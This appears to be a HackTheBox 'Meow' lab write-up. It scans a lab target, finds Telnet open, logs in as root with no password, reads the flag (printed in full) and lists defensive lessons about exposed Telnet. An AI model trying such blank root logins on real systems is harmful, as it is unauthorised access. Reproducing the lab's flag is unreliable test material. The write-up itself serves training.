# Meow

This is a HackTheBox Starting Point lab for practicing basic service enumeration and identifying insecure remote access configuration.

## Reconnaissance

Started with **RustScan** and **Nmap** to identify open ports and services on the target.

```bash
target=10.129.108.227
rustscan --ulimit 5000 -a $target -- -sC -sV
```

The scan identified one open port:

```text
23/tcp open  telnet  Linux telnetd
```

Nmap reported the service as **Linux telnetd**, indicating that the host exposed Telnet for remote login.

---

## Telnet Access

Connected to the target using Telnet:

```bash
telnet $target
```

The service presented a login prompt:

```text
Meow login:
```

Attempted to log in as `root`:

```text
root
```

The login succeeded and returned an interactive shell:

```text
Welcome to Ubuntu 20.04.2 LTS
root@Meow:~#
```

The system banner showed the target was running **Ubuntu 20.04.2 LTS** with kernel `5.4.0-77-generic`.

---

## Flag

Listed the home directory:

```bash
ls
```

Result:

```text
flag.txt  snap
```

Read the flag:

```bash
cat flag.txt
```

Result:

```text
b40abdfe23665f766f9c61ecba8a4c19
```

---

## Attack Path

```text
RustScan / Nmap
        ↓
Telnet Service Discovery
        ↓
Telnet Login Prompt
        ↓
Root Login Attempt
        ↓
Unauthenticated Root Shell
        ↓
Flag Retrieval
```

## Key Takeaways

* Telnet is an insecure remote access protocol because it does not provide encrypted transport.
* Exposing Telnet externally creates unnecessary risk, especially when privileged accounts are allowed to authenticate directly.
* The `root` account should not be reachable through remote login services.
* Basic service enumeration can quickly identify high-impact misconfigurations.
